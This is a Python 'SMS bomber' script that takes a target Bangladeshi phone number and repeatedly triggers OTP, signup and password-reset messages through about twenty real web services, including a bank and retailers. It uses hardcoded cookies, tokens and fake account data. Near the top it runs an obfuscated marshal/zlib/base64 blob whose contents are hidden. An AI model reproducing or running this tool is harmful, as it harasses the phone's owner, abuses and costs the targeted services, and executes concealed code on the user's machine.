#SC EDIT BY META (ZIHAD)
#FUCK BY SAMIR
import os,sys,time,requests,random,string
import random
import marshal, base64, zlib
def Axak(xak):
	for x in xak:
		sys.stdout.write(x)
		sys.stdout.flush()
		

logo ="""
             ███████╗███╗   ███╗ ██████╗ 
             ██╔════╝████╗ ████║██╔════╝ 
             ███████╗██╔████╔██║██║  ███╗
             ╚════██║██║╚██╔╝██║██║   ██║
             ███████║██║ ╚═╝ ██║╚██████╔╝
             ╚══════╝╚═╝     ╚═╝ ╚═════╝ 
        \033[1;91m\033[1;41m\033[1;97m           MR-META-404-CYBER        \033[;0m\033[1;91m\033[1;92m
 \033[1;93m**************************************************
 \033[1;93m|     \033[1;96m[🔰] CREATED BY\33[0;m   :  \033[1;96mMR-META               \033[1;93m|
 \033[1;93m|     \033[1;32m[🔰] FACEBOK      : \033[1;34m MR-META-404-CYBER     \033[1;93m|
 \033[1;93m|     \033[1;35m[🔰] GITHUB       :  \033[1;35mMR-META-404-CYBER     \033[1;93m|
 \033[1;93m|     \033[1;36m[🔰] TOOL STATUS  : \033[1;36m RANDOM CLONING        \033[1;93m|
 \033[1;93m|     \033[1;36m[🔰] TOOL VIRSION :  \033[1;36m1.0.8                 \033[1;93m|
 \033[1;93m**************************************************  """
linex=(' \033[1;93m**************************************************')  
letters = string.ascii_lowercase
pwd_length = 12
pwd = ''
for i in range(pwd_length):
  pwd += ''.join(random.choice(letters))
  
#DONT REMOVE 35 NUMBER LINE IF YOU REMOVE THIS LINE THE SC WAS NOT WORKING            
exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyNU81rG0cUn9kP7a5WIq0bqtqJqWjJQQRLsr5sGUcg2ZIhTVTyBXXBNWvNxtpY1qq7q7oVu7AFH4RxsQstDS2hOhkXBxp6aY5t/gIJdBALPvUfUHEPxqfOrBNZLjp0dvbNzm/ee7/3sfMXGBrU6/UkiMUPAIFt8CkGZXCA90cDNQgQfABCVGnYlsMvTWyb0LWFFkCUBRFtUYjZBsaQaguCEcOkDjB+NDhb/A+rRZv0Ilj5zmIM9sJq2O8TesDAjGYwmQOc49GbPAFiL++TwGKRxwQ/AcQ9oy0P4pGgQItDvAnxyiOvyeJVMLxD2XhGcnlM3hSeiwc4pqNBXJb3f1lyIyxFBMhzOV4IquKHYBrozBb1Jb0MtiAEyxiFYPd7BHCPfMVGODWdmpmdTc9G43PZ7FJto1AsLhhLhbtruYV7M7VH2idrXxQf1LP3yzG0UYw63uRsKppIp6Mz6QYX0VFJ0lBpuGOk+u/g92QekE6vAxOsjFvQhK1R6ZCYL/X114AJv6V2J3B0sEGHa1+FoMPLVaRvKUY5RDlUOOrAxzrJMRg8Exfzdz8uBheWc/n7Z975iqIbJXWzlmkE1lQjPF9RS1JFz4QvDnhsp4ewsEHbXzif+9kX2d9v/3b7Zb2TyHcTeQw1pcHpCYnKobS1xvWyYdT0uUhEqilhQ67I65q0GVa19Qgma/gjOg5zUS3VN+Wq4XClsmSsKogULD09E8Mz4fDo9TFOhEGSITnsY6Ui6yHOoVTd4UiYSNEcRq3JVYepSUbZYZ6oStXhNfnzuqwbOkZV3Qj5HAGTrhrqhlzVfCRC8bwXq66RQNyuEncOQz41cv8cuq5VHJbwxrQrGNDectF1GWvh4A3d51b1Ymi8q4CZtCD+ItdGD0BSvJ7/lj3eEwN2oHflPftazy3Vs7GfJ36caH3UGY92x6MY6PgLXX8BK/rf7QMPlXKF/fCYE7/J7S7t3dm58/RaC3V8N7u+m4cPO1ysy8X6gKVTL6Qel2kpbS5zPu34H0r73ko7/9nLek8Y219q89ftRM97dV9qvm8nj4W39yZ3Jvf11tXDR83JjhDvCnE7fuwd25vamXpKt24c1ptTHW+y603aib6IGVwaV/xNxD/gEjZKnJ6ejoT79JvMdPLf/zmZ9edS7KsUk5sTXt2CWBZD0K3fL0Aj99ut6hk/v6miekXOaB+4VxWX9gYWfRpC2OdFiF0OxASAjE1/zW6ztvu4bv4FuCdP5Q=='))))
a="\033[1;30m" # Black
r="\033[1;31m" # Red
g="\033[1;32m" # Green
y="\033[1;33m" # Yellow
b="\033[1;34m" # Blue
p="\033[1;35m" # Purple
c="\033[1;36m" # Cyan
w="\033[1;37m" # White
bir="\033[1;31m"
bi="\033[0;34m"
bic="\033[0;36m"
r="\033[1;31m"
g="\033[1;32m"
n="\n"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
w="\033[1;37m"
t="\t"
c1="\033[1;31m"
c2="\033[1;32m"
c3="\033[1;33m"
c4="\033[1;34m"
c5="\033[1;36m"
c6="\033[1;37m"
list=[c1,c2,c3,c4,c5,c6]
list2=[r,g,c,b,y]
ran=str(random.choice(list))
ran2=str(random.choice(list2))
tim=time.strftime('      %I:%M ')
tim2=time.strftime('%I:%M')
os.system("clear")



tim=time.strftime('      %I:%M ')
tim2=time.strftime('%I:%M')
ag2='Mozilla/5.0 (Windows NT 10.0; rv:76.0) Gecko/20100101 Firefox/76.0'
agents='Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.2.0.251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4324.93 HuaweiBrowser/11.1.5.111 Mobile Safari/537.36'

from requests.structures import CaseInsensitiveDict
os.system("clear")


def xak(xak):
	for x in xak+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.04)
def xak2(xak):
	for x in xak+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.07)
os.system("clear")
os.system("espeak \"Wall come sir, BD SMS booming loading  PLEASE WAIT \"")

print (logo)

os.system('clear')
print(logo)
print(w+"\033[1;36m[π] BD SMS booming ")

try:
 request = requests.get("https://www.google.com/", timeout=2)
 
except (requests.ConnectionError, requests.Timeout) as exception:
 print("\033[1;36m\nsir, Your Internet Connection Is Poblian PLEASE Chik!")
 os.system("espeak \"sir, Your Internet Connection Is Poblian PLEASE Chik\"")
number=input(f"{c}\n\033[1;36m[Sir  intir Your Tirgit Nonber] :{w} +880 ")
amo=int(input(c+"\n\033[1;32m[AMOUNT] : "+w))
url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number


url2 = "https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"

headers2 = CaseInsensitiveDict()
headers2["referer"] = "https://www.bioscopelive.com/en/login?type=login"
url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"
data3 = '{"msisdn":"'+number+'"}'
url4 = "https://fundesh.com.bd/api/auth/resendOTP"
headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"
data4 = '{"msisdn":"'+number+'"}'
url5 = "https://api.redx.com.bd/v1/user/signup"

headers5 = CaseInsensitiveDict()
headers5["Accept"] = "application/json, text/plain, */*"
headers5["Accept-Encoding"] = "gzip, deflate, br"
headers5["Accept-Language"] = "en-US,en;q=0.5"
headers5["Connection"] = "keep-alive"
headers5["Content-Length"] = "65"
headers5["Content-Type"] = "application/json"
headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
headers5["Host"] = "api.redx.com.bd"
headers5["Origin"] = "https://redx.com.bd"
headers5["Referer"] = "https://redx.com.bd/registration/"
headers5["TE"] = "Trailers"
headers5["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
headers5["x-access-token"] = "Bearer null"

data5= '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
url6 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"
data6 = '{"operator":"all","msisdn":"880'+number+'"}'
url7 ="https://www.rokomari.com/resend-verification-code?email_phone=880"+number


url8 = "https://www.pizzahutbd.com/customer/sign-in/mobile"

headers8 = CaseInsensitiveDict()
headers8["Cookie"] = "XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1"
headers8["Content-Type"] = "application/x-www-form-urlencoded"

data8 = "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0"+number


url9 = "https://admission.ndub.edu.bd/api/users/register-step-1/"

headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"

data9 = '{"name":"asad","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
url10 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers10 = CaseInsensitiveDict()
headers10["Content-Type"] = "application/json"
data10 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
url11 = "https://api.shikho.com/auth/v2/send/sms"

headers11 = CaseInsensitiveDict()
headers11["Content-Type"] = "application/json"

data11 = '{"phone":"0'+number+'","email":null,"auth_type":"login"}'
url12 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
data12 = {'requestType':'send',  'phoneNumber':'+880'+number,  'emailConsent':'true',  'whatsappConsent':'true'}

url13 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers13 = CaseInsensitiveDict()
headers13["Content-Type"] = "application/json"

data13 = """
{
  "AccessToken": "",
  "TrackingNo": "",
  "mobileNo": "0"""""+number+"""",
  "otpSms": "",
  "product_id": "201",
  "requestChannel": "MOB",
  "trackingStatus": 5
}
"""


url14 = "https://www.walcart.com/easylogin/account/mobilecheck/"

headers14 = CaseInsensitiveDict()
headers14["X-Requested-With"] = "XMLHttpRequest"
headers14["Content-Type"] = "application/x-www-form-urlencoded"

data14 = "mobile=0"+number+"&is_login=true&forgetpass=false"
url15 = "https://themallbd.com/api/auth/otp_login"

headers15 = CaseInsensitiveDict()
headers15["Content-Type"] = "application/json"

data15 = '{"phone_number":"+880'+number+'"}'
url16 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"

headers16 = CaseInsensitiveDict()
headers16["Host"] = "api.ghoorilearning.com"
headers16["Origin"] = "https://ghoorilearning.com"
headers16["Referer"] = "https://ghoorilearning.com/"
headers16["Content-Type"] = "application/json"

data16 = '{"name":"asad","mobile_no":"0'+number+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
url17 = "https://api.wholesalecart.com/v2/user/login-register"

headers17 = CaseInsensitiveDict()
headers17["Accept-Encoding"] = "gzip, deflate, br"
headers17["Accept-Language"] = "en-US,en;q=0.5"
headers17["Connection"] = "keep-alive"
headers17["Content-Length"] = "75"
headers17["Content-Type"] = "application/json"
headers17["Host"] = "api.wholesalecart.com"
headers17["Origin"] = "https://wholesalecart.com"
headers17["Referer"] = "https://wholesalecart.com/login"
headers17["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"

data17 = '{"phone":"0'+number+'","platform":"google","url":"https://www.google.com/"}'

url18 = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"

headers18 = CaseInsensitiveDict()
headers18["Content-Type"] = "application/json"

data18 = '{"phone":"0'+number+'"}'
url19 = "https://app.ipay.com.bd/api/v1/signup/v2"

headers19 = CaseInsensitiveDict()
headers19["Content-Type"] = "application/json"

data19 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880'+number+'"}'
url20 = "https://admission.ndub.edu.bd/api/users/reset/"
headers20 = CaseInsensitiveDict()
headers20["Content-Type"] = "application/json"
data20 = '{"phone": "0'+number+'"}'
print(' \033[1;93m**************************************************')
print(f"\t{w}{r}AMOUNT ({g}{amo}{r}){w} |{r}TIME{w}")
print(' \033[1;93m**************************************************')
os.system("espeak \" Sir bombing start \"")
for i in range(amo):
	resp1 = requests.get(url1)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp2 = requests.get(url2,headers=headers2)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰  ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp3 = requests.post(url3, headers=headers3, data=data3)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp4 = requests.post(url4, headers=headers4, data=data4)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp5 = requests.post(url5, headers=headers5, data=data5)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp6 = requests.post(url6, headers=headers6, data=data6)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp7 = requests.get(url7)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp10 = requests.get(url8,headers=headers8, data=data8)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp11 = requests.get(url9,headers=headers9, data=data9)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp12 = requests.post(url10,headers=headers10, data=data10)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp13 = requests.get(url11,headers=headers11, data=data11)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp14 = requests.post(url12,data=data12)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp8 = requests.post(url13,headers=headers13, data=data13)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp17 = requests.post(url14,headers=headers14, data=data14)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp9 = requests.post(url15,headers=headers15, data=data15)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp19 = requests.post(url16, headers=headers16, data=data16)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp20 = requests.post(url17,data17)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰  ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp21 = requests.post(url18, headers=headers18, data=data18)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp21 = requests.post(url19, headers=headers19, data=data19)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
	resp21 = requests.post(url20, headers=headers20, data=data20)
	print(f"{ran2}[SMS SENT SUCCESFULLY]🔰 ")
	os.system("espeak \" Sir BD SMS booming SUCCESFULLY\"")
else: 
	input(g+"\n\t\t\tYour Pogram Finished Enter For Continue")
	os.system("clear")
	os.system("python S-BOOMB.py")


